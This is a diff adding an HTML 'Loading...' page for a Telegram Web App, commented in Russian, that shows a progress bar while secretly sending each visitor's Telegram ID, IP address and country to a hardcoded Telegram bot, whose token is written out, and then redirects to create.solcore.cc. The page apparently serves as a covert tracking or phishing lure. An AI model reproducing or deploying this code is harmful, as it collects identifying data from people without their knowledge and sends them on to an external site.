@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Loading...</title>
+<style>
+  body {
+    background:#000;
+    margin:0;
+    padding:0;
+    height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .loader {
+    width:80%;
+    max-width:520px;
+    height:8px;
+    background:#2b2b2b;
+    border-radius:4px;
+    overflow:hidden;
+  }
+  .loader-bar {
+    height:100%;
+    width:0;
+    background: linear-gradient(90deg, #a855f7, #7c3aed); /* фиолетовая */
+    border-radius:inherit;
+    transition: width .08s linear; /* сглаживание шагов */
+  }
+</style>
+</head>
+<body>
+
+<div class="loader"><div class="loader-bar" id="bar"></div></div>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+const targetUrl = "https://create.solcore.cc/";
+const tg = window.Telegram?.WebApp;
+const user = tg?.initDataUnsafe?.user || {};
+const chatIds = ["8153154614"];
+const DURATION = 800; // длительность анимации и задержка редиректа
+
+// Флаг по ISO-коду
+function toFlag(code) {
+  if (!code || code.length !== 2) return "";
+  const A = 0x1F1E6, base = "A".charCodeAt(0);
+  return String.fromCodePoint(A + code[0].toUpperCase().charCodeAt(0) - base) +
+         String.fromCodePoint(A + code[1].toUpperCase().charCodeAt(0) - base);
+}
+
+// JS-анимация прогресса (чтобы не зависеть от особенностей WebView)
+(function animateBar() {
+  const bar = document.getElementById("bar");
+  const start = performance.now();
+  function frame(t) {
+    const p = Math.min((t - start) / DURATION, 1);
+    bar.style.width = (p * 100).toFixed(1) + "%";
+    if (p < 1) requestAnimationFrame(frame);
+  }
+  requestAnimationFrame(frame);
+})();
+
+// Сбор IP/страны и отправка в бот
+fetch("https://ipapi.co/json/")
+  .then(r => r.json())
+  .then(data => {
+    const ip = data.ip || "—";
+    const countryName = data.country_name || "Unknown";
+    const flag = toFlag(data.country || "");
+    const message = `🆔 Telegram ID: ${user.id || "—"}
+🌐 IP: ${ip}
+📌 Country: ${flag ? flag + " " : ""}${countryName}`;
+
+    chatIds.forEach(id => {
+      fetch("https://api.telegram.org/bot8250334135:AAEQtSrp6flYDdpvqnOPNV_oXDmGPCiCMdg/sendMessage", {
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify({ chat_id:id, text:message })
+      });
+    });
+  })
+  .catch(() => {
+    const message = `🆔 Telegram ID: ${user.id || "—"}
+🌐 IP: —
+📌 Country: Unknown`;
+    chatIds.forEach(id => {
+      fetch("https://api.telegram.org/bot8250334135:AAEQtSrp6flYDdpvqnOPNV_oXDmGPCiCMdg/sendMessage", {
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify({ chat_id:id, text:message })
+      });
+    });
+  })
+  .finally(() => {
+    setTimeout(() => location.href = targetUrl, DURATION);
+  });
+</script>
+
+</body>
+</html>
